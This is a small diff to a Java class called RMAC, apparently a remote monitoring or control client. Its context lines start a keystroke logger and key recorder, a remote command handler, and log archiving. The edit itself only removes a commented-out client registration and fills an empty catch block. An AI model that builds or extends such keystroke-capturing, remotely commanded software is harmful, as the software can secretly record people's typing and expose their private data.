@@ -140,8 +140,6 @@ public class RMAC {
     keyLog.start();
     // Register JNativeHook
     keyRecorder = (KeyRecorder) this.getInstance(KeyRecorder.class);
-    /*// Register this Client
-    service.registerClient();*/
     // Initialize CommandHandler
     commandHandler = (CommandHandler) this.getInstance(CommandHandler.class);
     commandHandler.start();
@@ -260,6 +258,7 @@ public class RMAC {
       fs.move(Constants.LOG_LOCATION, logFilePath, StandardCopyOption.REPLACE_EXISTING);
       RMAC.archiver.moveToArchive(logFilePath, ArchiveFileType.OTHER);
     } catch (IOException ignored) {
+      /**/
     }
 
     try {
